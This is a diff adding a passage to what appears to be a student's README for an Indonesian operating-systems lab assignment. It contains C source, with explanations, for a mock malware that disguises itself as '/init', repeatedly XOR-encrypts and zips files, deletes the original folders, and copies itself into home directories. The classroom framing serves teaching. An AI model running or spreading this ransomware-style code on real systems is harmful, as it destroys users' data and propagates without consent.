@@ -466,7 +466,304 @@ Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di P
 A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
 
 ## Soal_3
-</div>
+[Author: Afnaan / honque]
+
+> Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini
+
+a. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
+```bash
+if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+```
+- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama adalah "init".
+- `daemonize();`: Mengubah proses menjadi daemon (background process).
+- `chdir(cwd);`: Berpindah ke working directory awal
+- `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Menyamarkan nama proses di sistem menjadi "/init".
+
+b. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor bekerja dengan mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program.
+
+```sh
+void encrypt_all_files(const char *dirpath, const char *self_exe) {
+    DIR *dir = opendir(dirpath);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
+
+        struct stat st;
+        if (stat(fullpath, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            encrypt_all_files(fullpath, self_exe);
+        } else if (S_ISREG(st.st_mode)) {
+            if (strcmp(fullpath, self_exe) != 0) {
+                printf("Enkripsi: %s\n", fullpath);
+                simple_xor_encrypt(fullpath);
+            }
+        }
+    }
+
+    closedir(dir);
+}
+```
+- Melakukan rekursi ke semua file dalam folder dirpath
+- Mengenkripsi semua file reguler selain dirinya sendiri (self_exe)
+- `if (S_ISDIR(st.st_mode)) {
+        encrypt_all_files(fullpath, self_exe);
+    } `Jika item adalah direktori, lakukan rekursi ke dalamnya.
+- `else if (S_ISREG(st.st_mode)) {
+        if (strcmp(fullpath, self_exe) != 0) {
+            printf("Enkripsi: %s\n", fullpath);
+            simple_xor_encrypt(fullpath);
+        }
+    }` Jika file biasa, dan bukan executable malware itu sendiri, tampilkan log dan enkripsi file.
+```sh
+void simple_xor_encrypt(const char *filename) {
+    FILE *f = fopen(filename, "rb+");
+    if (!f) {
+        perror("Gagal membuka file untuk enkripsi");
+        return;
+    }
+
+    time_t timestamp = time(NULL);
+    unsigned char key[8];
+    for (int i = 0; i < 8; i++) {
+        key[i] = (timestamp >> (i * 8)) & 0xFF;
+    }
+
+    int c;
+    size_t i = 0;
+    while ((c = fgetc(f)) != EOF) {
+        fseek(f, -1, SEEK_CUR);
+        fputc(c ^ key[i % 8], f);
+        i++;
+    }
+
+    fclose(f);
+}
+```
+- `FILE *f = fopen(filename, "rb+");
+if (!f) {
+    perror("Gagal membuka file untuk enkripsi");
+    return;
+}` Buka file untuk dibaca dan ditulis. Jika gagal, tampilkan error dan keluar.
+- `time_t timestamp = time(NULL);
+unsigned char key[8];
+for (int i = 0; i < 8; i++) {
+    key[i] = (timestamp >> (i * 8)) & 0xFF;
+} `Bangkitkan key 8-byte dari UNIX timestamp. XOR key ini akan digunakan untuk enkripsi.
+- `int c;
+size_t i = 0;
+while ((c = fgetc(f)) != EOF) {
+    fseek(f, -1, SEEK_CUR);
+    fputc(c ^ key[i % 8], f);
+    i++;
+} ` Baca byte demi byte, lalu XOR dengan key, lalu tulis kembali ke tempat semula (fseek menggeser pointer kembali satu byte).
+```sh
+void delete_directory(const char *path) {
+    DIR *dir = opendir(path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+
+        struct stat st;
+        if (stat(fullpath, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            delete_directory(fullpath);
+        } else {
+            unlink(fullpath);
+        }
+    }
+
+    closedir(dir);
+    rmdir(path);
+}
+```
+Menghapus semua isi dari direktori (rekursif) pakai `unlink`, termasuk subfolder
+Setelah kosong, hapus folder induknya pakai `rmdir`
+- `struct stat st;
+    if (stat(fullpath, &st) == -1) continue;` Ambil metadata.
+- `if (S_ISDIR(st.st_mode)) {
+        delete_directory(fullpath);
+    } else {
+        unlink(fullpath);
+    }` Jika direktori: panggil ulang delete_directory. Jika file biasa: hapus dengan unlink.
+
+```sh
+void zip_and_encrypt() {
+    DIR *dir = opendir(".");
+    if (!dir) {
+        perror("Gagal membuka direktori");
+        return;
+    }
+
+    struct dirent *entry;
+    char exe_path[1024];
+    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    exe_path[sizeof(exe_path) - 1] = '\0';
+
+    pid_t zip_pids[1024];
+    char folders_to_delete[1024][256];
+    int pid_index = 0;
+    int folder_index = 0;
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        struct stat st;
+        if (stat(entry->d_name, &st) == -1)
+            continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            char zipname[1024];
+            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
+
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
+                execvp("zip", argv);
+                perror("execvp zip gagal");
+                exit(1);
+            } else if (pid > 0) {
+                zip_pids[pid_index++] = pid;
+                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
+            }
+        }
+    }
+    closedir(dir);
+
+    for (int i = 0; i < pid_index; i++) {
+        int status;
+        waitpid(zip_pids[i], &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
+        }
+    }
+
+    encrypt_all_files(".", exe_path);
+    printf("Encryption don.\n");
+
+    for (int i = 0; i < folder_index; i++) {
+        delete_directory(folders_to_delete[i]);
+        printf("Folder %s deleted.\n", folders_to_delete[i]);
+    }
+}
+```
+- `struct dirent *entry;
+char exe_path[1024];
+readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+exe_path[sizeof(exe_path) - 1] = '\0';` Ambil path lengkap dari executable yang sedang berjalan agar tidak dienkripsi oleh `encrypt_all_files`.
+- `snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
+	pid_t pid = fork();
+        if (pid == 0) {
+            char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
+            execvp("zip", argv);
+            perror("execvp zip gagal");
+            exit(1);
+        } else if (pid > 0) {
+            zip_pids[pid_index++] = pid;
+            strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
+        }}` Buat .zip berisi folder tersebut (pakai `zip -r`)
+- Simpan nama foldernya agar nanti dihapus
+- Tunggu semua proses zip selesai
+- Jalankan `encrypt_all_files()` → mengenkripsi semua `.zip` dan file lainnya (kecuali `malware.c` sendiri)
+- Hapus folder-folder asli dengan `delete_directory()`
+
+```sh
+void wannacryptor() {
+    FILE *log = fopen("/tmp/wannalog.txt", "a+");
+    if (!log) exit(1);
+
+    while (1) {
+        zip_and_encrypt();
+
+        fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n");
+        fflush(log);
+
+        sleep(30);
+    }
+}
+```
+- `FILE *log = fopen("/tmp/wannalog.txt", "a+");` Membuka file log di path `/tmp/wannalog.txt;` Mode "a+" berarti: buka untuk baca/tulis
+- `while (1) {
+        zip_and_encrypt();` Mengarsip (zip) semua folder di direktori saat ini, mengenkripsi semua file zip dan file lain, lalu menghapus folder asli setelah zip.
+
+c. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
+```sh
+void trojan_wrm() {
+    const char *source = "/proc/self/exe";
+    const char *runme_name = "runme";
+    const char *target_base = "/home/riverz";
+
+    DIR *dir = opendir(target_base);
+    if (!dir) {
+        perror("Gagal membuka direktori target");
+        exit(1);
+    }
+
+    struct dirent *entry;
+    char dest_path[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        char folder_path[1024];
+        snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);
+
+        struct stat st;
+        if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode))
+            continue;
+
+        snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);
+
+        FILE *src = fopen(source, "rb");
+        FILE *dst = fopen(dest_path, "wb");
+
+        if (!src || !dst) {
+            perror("Gagal copy file runme");
+            if (src) fclose(src);
+            if (dst) fclose(dst);
+            continue;
+        }
+
+        int ch;
+        while ((ch = fgetc(src)) != EOF)
+            fputc(ch, dst);
+
+        fclose(src);
+        fclose(dst);
+
+        chmod(dest_path, 600);
+
+        printf("Berhasil copy ke %s\n", dest_path);
+    }
+
+    closedir(dir);
+
+    while (1) {
+        sleep(5);
+    }
+}
+```
+
 
 
 <div align=center>
